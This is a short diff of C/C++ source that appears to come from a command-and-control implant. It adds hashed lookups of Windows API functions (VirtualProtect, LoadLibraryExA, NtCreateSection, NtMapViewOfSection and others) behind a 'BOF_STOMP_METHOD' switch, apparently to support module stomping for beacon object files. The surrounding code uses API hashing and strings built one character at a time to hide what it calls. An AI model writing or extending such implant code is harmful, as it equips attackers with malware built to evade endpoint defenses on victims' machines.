@@ -143,6 +143,9 @@ BOOL ApiLoad()
 		ApiWin->WideCharToMultiByte		= (decltype(WideCharToMultiByte)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_WIDECHARTOMULTIBYTE);
 		ApiWin->WriteFile				= (decltype(WriteFile)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_WRITEFILE);
 
+		ApiWin->VirtualProtect			= (decltype(VirtualProtect)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_VIRTUALPROTECT);
+		ApiWin->LoadLibraryExA			= (decltype(LoadLibraryExA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOADLIBRARYEXA);
+
 		// iphlpapi
 		CHAR iphlpapi_c[13];
 		iphlpapi_c[0]  = HdChrA('I');
@@ -282,6 +285,16 @@ BOOL ApiLoad()
 			ApiNt->RtlIpv4StringToAddressA   = (decltype(RtlIpv4StringToAddressA)*)	  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLIPV4STRINGTOADDRESSA);
 			ApiNt->RtlRandomEx               = (decltype(RtlRandomEx)*)				  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLRANDOMEX);
 			ApiNt->RtlNtStatusToDosError     = (decltype(RtlNtStatusToDosError)*)	  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLNTSTATUSTODOSERROR);
+#ifdef _WIN64
+			ApiNt->RtlAddFunctionTable    	 = (decltype(RtlAddFunctionTable)*)    GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLADDFUNCTIONTABLE);
+			ApiNt->RtlDeleteFunctionTable 	 = (decltype(RtlDeleteFunctionTable)*) GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLDELETEFUNCTIONTABLE);
+#endif
+#if defined(BOF_STOMP_METHOD) && BOF_STOMP_METHOD == 1
+			ApiNt->NtCreateSection           = (decltype(NtCreateSection)*)          GetSymbolAddress(hNtdllModule, HASH_FUNC_NTCREATESECTION);
+			ApiNt->NtMapViewOfSection        = (decltype(NtMapViewOfSection)*)       GetSymbolAddress(hNtdllModule, HASH_FUNC_NTMAPVIEWOFSECTION);
+			ApiNt->NtUnmapViewOfSection      = (decltype(NtUnmapViewOfSection)*)     GetSymbolAddress(hNtdllModule, HASH_FUNC_NTUNMAPVIEWOFSECTION);
+			ApiNt->NtOpenFile                = (decltype(NtOpenFile)*)               GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENFILE);
+#endif /* BOF_STOMP_METHOD == 1 */
 		}
 		else {
 			return FALSE;
